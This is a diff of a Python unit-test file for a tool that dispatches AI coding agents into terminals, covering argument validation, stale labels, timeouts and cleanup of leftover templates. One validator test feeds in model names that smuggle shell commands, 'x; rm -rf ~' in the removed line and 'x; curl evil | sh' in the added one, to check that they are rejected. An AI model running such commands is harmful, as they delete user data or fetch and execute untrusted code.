@@ -60,7 +60,15 @@ class HarnessArgsTest(unittest.TestCase):
         with self.assertRaisesRegex(ValueError, "--effort is one of"):
             dispatch.harness_args("claude", effort="ultra")
         with self.assertRaisesRegex(ValueError, "model name"):
-            dispatch.harness_args("claude", model="x; rm -rf ~")
+            dispatch.harness_args("claude", model="x; curl evil | sh")
+
+
+class EffortValuesTest(unittest.TestCase):
+    def test_each_program_takes_only_its_own_values(self):
+        for harness, effort in (("codex", "max"), ("codex", "xhigh"), ("grok", "max")):
+            with self.subTest(harness=harness, effort=effort), self.assertRaisesRegex(ValueError, "takes --effort"):
+                dispatch.harness_args(harness, effort=effort)  # refused before a start, not a start that fails
+        self.assertEqual(dispatch.harness_args("claude", effort="max"), ["--effort", "max"])
 
 
 class DispatchTest(unittest.TestCase):
@@ -118,9 +126,45 @@ class DispatchTest(unittest.TestCase):
 
     def test_the_template_goes_also_when_hc_fails(self):
         self.fake.fail["run"] = "core not reachable"
-        with self.assertRaisesRegex(HcError, "core not reachable"):
+        with self.assertRaisesRegex(HcError, "core not reachable.*may have started anyway.*roster"):
             self.dispatch()
         self.assertEqual(list(self.templates.glob(".dispatch-*")), [])
+
+    def test_a_stale_label_on_another_program_does_not_count_as_running(self):
+        self.fake.terminals.append(terminal("t5", "claude-code", {AGENT_LABEL: "Angy"}))  # Angy ended, claude runs there
+        self.assertEqual(self.dispatch().action, "started")
+        self.assertEqual(self.fake.sent(), [])
+
+    def test_parent_and_space_only_from_a_terminal_that_exists(self):
+        self.env["COCKPIT_HC_ADDRESS"] = "t77@mac"  # no such terminal
+        self.dispatch()
+        run = self.fake.runs()[0]
+        self.assertNotIn("--parent", run)
+        self.assertNotIn("--label", run)
+
+    def test_the_start_waits_longer_than_an_ordinary_hc_call(self):
+        seen = []
+
+        def runner(argv, timeout):
+            seen.append((argv[1], timeout))
+            return 0, json.dumps({"address": "t9", "first_message": {"sent": True}}), ""
+        Hc("/bin/hc", runner).run_template("x", "task", "job")
+        self.assertEqual(seen, [("run", 150)])
+
+    def test_leftovers_of_a_killed_start_are_swept(self):
+        import os
+        self.templates.mkdir(parents=True)
+        old = self.templates / ".dispatch-old-aaaaaa.md"
+        old.write_text(dispatch.template_text(self.paths, "Angy", "agy", []))
+        fresh = self.templates / ".dispatch-new-bbbbbb.md"
+        fresh.write_text(dispatch.template_text(self.paths, "Angy", "agy", []))
+        foreign = self.templates / ".dispatch-mine.md"
+        foreign.write_text("---\ncommand: x\n---\n")
+        os.utime(old, (0, 0))
+        os.utime(foreign, (0, 0))
+        dispatch.sweep(self.paths)
+        self.assertEqual(sorted(p.name for p in self.templates.iterdir()),
+                         [".dispatch-mine.md", ".dispatch-new-bbbbbb.md"])
 
     def test_a_task_that_did_not_arrive_is_an_error_with_the_address(self):
         self.fake.sent_first = False
@@ -165,6 +209,19 @@ class FocusTest(unittest.TestCase):
     def test_finds_the_running_terminal_but_not_this_one(self):
         self.assertEqual(self.elsewhere("t2"), "t1")
         self.assertEqual(self.elsewhere("t1"), "")
+
+    def test_a_stale_label_under_another_program_is_not_the_agent(self):
+        self.fake.terminals[0]["app"] = "codex"  # the person runs codex where Conductor ran before
+        self.assertEqual(self.elsewhere("t2"), "")
+
+    def test_a_tab_whose_focus_failed_waits_so_the_line_can_be_read(self):
+        with mock.patch("cockpit.cli.Paths.from_env", return_value=self.paths), \
+                mock.patch.object(launch, "running_elsewhere", return_value="t1"), \
+                mock.patch.object(launch, "focus", return_value=False), \
+                mock.patch("cockpit.cli._on_terminal", return_value=True), \
+                mock.patch("cockpit.cli._hold_tab") as hold, redirect_stdout(io.StringIO()):
+            self.assertEqual(cli.main(["run", "Conductor"]), 0)
+        hold.assert_called_once()
 
     def test_without_hc_under_this_home_nothing_is_found(self):
         (self.paths.local_bin / "hc").unlink()
